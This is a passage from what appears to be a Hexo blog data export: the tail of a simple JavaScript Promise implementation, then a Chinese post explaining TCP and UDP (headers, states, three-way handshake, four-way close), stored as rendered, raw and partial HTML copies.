class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Promise 简易版实现原理</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">Promise</span> = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Promise</span>(<span class=\"params\">fn</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> callbacks = [];</span><br><span class=\"line\">  <span class=\"keyword\">var</span> state = <span class=\"string\">&quot;pending&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> value;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handler</span>(<span class=\"params\">callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (state === <span class=\"string\">&quot;pending&quot;</span>) &#123;</span><br><span class=\"line\">      callbacks.push(callback);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb = state === <span class=\"string\">&quot;fulfilled&quot;</span> ? callback.fulfilledCb : callback.rejectedCb;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cb === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// then 方法不传任何参数</span></span><br><span class=\"line\">      cb = state === <span class=\"string\">&quot;fulfilled&quot;</span> ? callback.resolve : callback.reject;</span><br><span class=\"line\">      cb(value);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> ret = cb(value);</span><br><span class=\"line\">    callback.resolve(value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">execute</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> callbacks.map(<span class=\"function\">(<span class=\"params\">cb</span>) =&gt;</span> handler(cb)), <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (val &amp;&amp; <span class=\"keyword\">typeof</span> val.then === <span class=\"string\">&quot;function&quot;</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 判断 resolve() 中的参数是否为 promise 对象</span></span><br><span class=\"line\">      val.then(resolve, reject);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    value = val;</span><br><span class=\"line\">    state = <span class=\"string\">&quot;fulfilled&quot;</span>;</span><br><span class=\"line\">    execute();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reject</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    value = val;</span><br><span class=\"line\">    state = <span class=\"string\">&quot;rejected&quot;</span>;</span><br><span class=\"line\">    execute();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.then = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">fulfilledCb, rejectedCb</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      handler(&#123;</span><br><span class=\"line\">        fulfilledCb: fulfilledCb || <span class=\"literal\">null</span>,</span><br><span class=\"line\">        rejectedCb: rejectedCb || <span class=\"literal\">null</span>,</span><br><span class=\"line\">        resolve: resolve,</span><br><span class=\"line\">        reject: reject,</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  fn(resolve, reject);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> num = <span class=\"built_in\">Math</span>.random();</span><br><span class=\"line\">  num &gt; <span class=\"number\">0.5</span> ? resolve(num) : reject(num);</span><br><span class=\"line\">&#125;).then(</span><br><span class=\"line\">  (num) =&gt; <span class=\"built_in\">console</span>.log(num),</span><br><span class=\"line\">  (num) =&gt; <span class=\"built_in\">console</span>.error(num)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>"},{"title":"TCP 与 UDP","date":"2021-01-14T07:32:00.000Z","_content":"\n#  TCP  与 UDP\n\n当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。\n\n在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。\n\n**怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？**\nTCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。\n\n> TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信）\n\nUDP 和 TCP 的特点\n* 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。\n* 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。\n\n> TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方\n\n## 一、UDP\n\nUDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。\n\n### 面向报文\nUDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 只是报文的搬运工，不会对报文进行任何拆分和拼接操作。\n\n具体来说\n* 在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了\n* 在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作\n\n### 不可靠性\n1. UDP 是无连接的，也就是说通信不需要建立和断开连接。\n2. UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的\n3. UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。\n\n### 高效\n因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。\n\n![UDP 头信息示意图](https://user-gold-cdn.xitu.io/2018/5/1/163195b245ceb89c?w=831&h=170&f=png&s=22793)\n\n头部包含了以下几个数据\n* 两个十六位的端口号，分别为源端口（可选字段）和目标端口\n* 整个数据报文的长度\n* 整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误\n\n### 传输方式\nUDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。\n\n### 特点\n1.  UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。\n2.  由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。\n3.  UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。\n4.  吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。\n5.  UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。\n6.  UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。\n\n> UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息\n\n## 二、TCP\nTCP（Transmission Control Protocol，传输控制协议）\n\nTCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：\n\n### 头部\n对于 TCP 头部来说，以下几个字段是很重要的\n\n* Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文\n* Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到\n* Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制\n* 标识符\n  * URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。\n  * ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。\n  * PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。\n  * RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。\n  * SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。\n  * FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。\n\n![TCP 头部示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631be45b084e4bc?w=858&h=305&f=png&s=62112)\n\n\n### 状态机\nHTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态\n\n![TCP 状态机示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631bef9e3c60035?w=1280&h=965&f=png&s=101432)\n\nLISTEN - 侦听来自远方 TCP 端口的连接请求； \nSYN-SENT -在发送连接请求后等待匹配的连接请求； \nSYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认； \nESTABLISHED- 代表一个打开的连接，数据可以传送给用户； \nFIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；\nFIN-WAIT-2 - 从远程 TCP 等待连接中断请求； \nCLOSE-WAIT - 等待从本地用户发来的连接中断请求； \nCLOSING -等待远程 TCP 对连接中断的确认； \nLAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认； \nTIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认； \nCLOSED - 没有任何连接状态；\n\n\n### 建立连接（三次握手）\n在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。\n\n*   第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认；\n*   第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。；\n*   第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。\n\n![TCP 三次握手示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631bf1e79b3cd42?w=666&h=426&f=png&s=32121)\n\n> 两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。\n> * 第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？”\n> * 第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。\n> * 第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。\n>  理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。\n\n### 断开连接（四次挥手）\n\n由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。\n\n> TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。\n\n1. 客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 \n2. 服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 \n3. 服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 \n4. 客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 \n\n![TCP 四次挥手示意图](https://user-gold-cdn.xitu.io/2018/5/2/1631fb807f2c6c1b?w=640&h=512&f=png&s=31059)\n\n\n","source":"_posts/HTTP/TCP  与 UDP.md","raw":"---\ntitle: TCP 与 UDP\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:32:00\n---\n\n#  TCP  与 UDP\n\n当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。\n\n在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。\n\n**怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？**\nTCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。\n\n> TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信）\n\nUDP 和 TCP 的特点\n* 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。\n* 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。\n\n> TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方\n\n## 一、UDP\n\nUDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。\n\n### 面向报文\nUDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 只是报文的搬运工，不会对报文进行任何拆分和拼接操作。\n\n具体来说\n* 在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了\n* 在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作\n\n### 不可靠性\n1. UDP 是无连接的，也就是说通信不需要建立和断开连接。\n2. UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的\n3. UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。\n\n### 高效\n因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。\n\n![UDP 头信息示意图](https://user-gold-cdn.xitu.io/2018/5/1/163195b245ceb89c?w=831&h=170&f=png&s=22793)\n\n头部包含了以下几个数据\n* 两个十六位的端口号，分别为源端口（可选字段）和目标端口\n* 整个数据报文的长度\n* 整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误\n\n### 传输方式\nUDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。\n\n### 特点\n1.  UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。\n2.  由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。\n3.  UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。\n4.  吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。\n5.  UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。\n6.  UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。\n\n> UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息\n\n## 二、TCP\nTCP（Transmission Control Protocol，传输控制协议）\n\nTCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：\n\n### 头部\n对于 TCP 头部来说，以下几个字段是很重要的\n\n* Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文\n* Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到\n* Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制\n* 标识符\n  * URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。\n  * ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。\n  * PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。\n  * RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。\n  * SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。\n  * FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。\n\n![TCP 头部示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631be45b084e4bc?w=858&h=305&f=png&s=62112)\n\n\n### 状态机\nHTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态\n\n![TCP 状态机示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631bef9e3c60035?w=1280&h=965&f=png&s=101432)\n\nLISTEN - 侦听来自远方 TCP 端口的连接请求； \nSYN-SENT -在发送连接请求后等待匹配的连接请求； \nSYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认； \nESTABLISHED- 代表一个打开的连接，数据可以传送给用户； \nFIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；\nFIN-WAIT-2 - 从远程 TCP 等待连接中断请求； \nCLOSE-WAIT - 等待从本地用户发来的连接中断请求； \nCLOSING -等待远程 TCP 对连接中断的确认； \nLAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认； \nTIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认； \nCLOSED - 没有任何连接状态；\n\n\n### 建立连接（三次握手）\n在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。\n\n*   第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认；\n*   第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。；\n*   第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。\n\n![TCP 三次握手示意图](https://user-gold-cdn.xitu.io/2018/5/1/1631bf1e79b3cd42?w=666&h=426&f=png&s=32121)\n\n> 两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。\n> * 第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？”\n> * 第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。\n> * 第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。\n>  理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。\n\n### 断开连接（四次挥手）\n\n由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。\n\n> TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。\n\n1. 客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 \n2. 服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 \n3. 服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 \n4. 客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 \n\n![TCP 四次挥手示意图](https://user-gold-cdn.xitu.io/2018/5/2/1631fb807f2c6c1b?w=640&h=512&f=png&s=31059)\n\n\n","slug":"HTTP/TCP  与 UDP","published":1,"updated":"2021-04-30T07:12:05.005Z","_id":"cko3z15pd0000mi6r39jn2gzm","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"TCP-与-UDP\"><a href=\"#TCP-与-UDP\" class=\"headerlink\" title=\"TCP  与 UDP\"></a>TCP  与 UDP</h1><p>当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。</p>\n<p>在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。</p>\n<p><strong>怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？</strong><br>TCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。</p>\n<blockquote>\n<p>TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信）</p>\n</blockquote>\n<p>UDP 和 TCP 的特点</p>\n<ul>\n<li>用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。</li>\n<li>传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。</li>\n</ul>\n<blockquote>\n<p>TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方</p>\n</blockquote>\n<h2 id=\"一、UDP\"><a href=\"#一、UDP\" class=\"headerlink\" title=\"一、UDP\"></a>一、UDP</h2><p>UDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。</p>\n<h3 id=\"面向报文\"><a href=\"#面向报文\" class=\"headerlink\" title=\"面向报文\"></a>面向报文</h3><p>UDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 